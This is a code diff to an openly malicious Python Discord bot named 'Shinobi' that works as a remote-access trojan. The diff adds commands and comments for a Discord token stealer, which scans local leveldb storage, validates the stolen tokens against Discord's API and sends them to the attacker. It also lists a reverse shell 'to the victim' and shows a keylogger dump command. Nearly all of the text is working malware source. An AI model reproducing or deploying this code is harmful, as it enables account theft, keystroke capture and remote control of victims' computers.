@@ -189,7 +189,8 @@ def stream():
 async def on_ready():
     report_channel = client.get_channel(959449626149285988)
     time.sleep(2)
-
+    pin_msg = await report_channel.send('!show_cmd')
+    pin_msg.pin()
     # sending message to report
     myEmbed = discord.Embed(title="Shinobi is Online at this address {}".format(victim_ip), color=0xc40e0e)
     myEmbed.add_field(name="** **",value="Send '!show_cmd' to the designated channel know what I'm capable of ")
@@ -224,6 +225,7 @@ async def on_ready():
 
 
 #reverse_shell
+# client
 @client.command()
 async def reverse_shell(message):
 
@@ -297,6 +299,8 @@ async def show_cmd(message):
     my_embed.add_field(name='!banner ', value='Display banner to the victim PC', inline=True)
     my_embed.add_field(name='!delete', value='Delete whole server convo', inline=True)
     my_embed.add_field(name='!rest', value='ShutDown Discord Bot', inline=True)
+    my_embed.add_field(name='!token', value='grabbing discord token', inline=True)
+    my_embed.add_field(name='!reverse_shell', value='gaining a shell to the victim', inline=True)
 
     await message.send(embed=my_embed)
 
@@ -502,7 +506,7 @@ async def show_keylogs(message):
      await message.send("Successfully dumped all the logs", file=file)
      os.remove(file_keys)
 
-# REVIEW: 
+# REVIEW:
 @client.command()
 async def token(message):
     await message.send("Grabbing discord token only")
@@ -510,6 +514,8 @@ async def token(message):
     await message.send(f"extracting tokens. . .")
     tokens = []
     saved = ""
+
+    # paths that may have Discord info like website or browser that has stored Discord Token
     paths = {
             'Discord': os.getenv('APPDATA') + r'\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': os.getenv('APPDATA') + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -537,19 +543,29 @@ async def token(message):
     for source, path in paths.items():
         if not os.path.exists(path):
             continue
+        # loop thru the file path and check if file is end with .log or .ldb
         for file_name in os.listdir(path):
+            # if path doesnt have file that eneded with .log or .ldb continue
             if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                 continue
+            # loop thru the remaining file path and read each line
             for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+
+                    # REVIEW: what is the regex looping
+                    # if there is a valid regex result append it to the empty variable
                     for token in re.findall(regex, line):
                         tokens.append(token)
+
+        # loop the tokens variable and request to the discord with the stolen token
         for token in tokens:
             r = requests.get("https://discord.com/api/v9/users/@me", headers={
                 "Content-Type": "application/json",
                 "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                 "Authorization": token
             })
+
+            # if status is 200 meaning the token is valid  return it to the saved variable and send it to the attacker
             if r.status_code == 200:
                 if token in saved:
                     continue
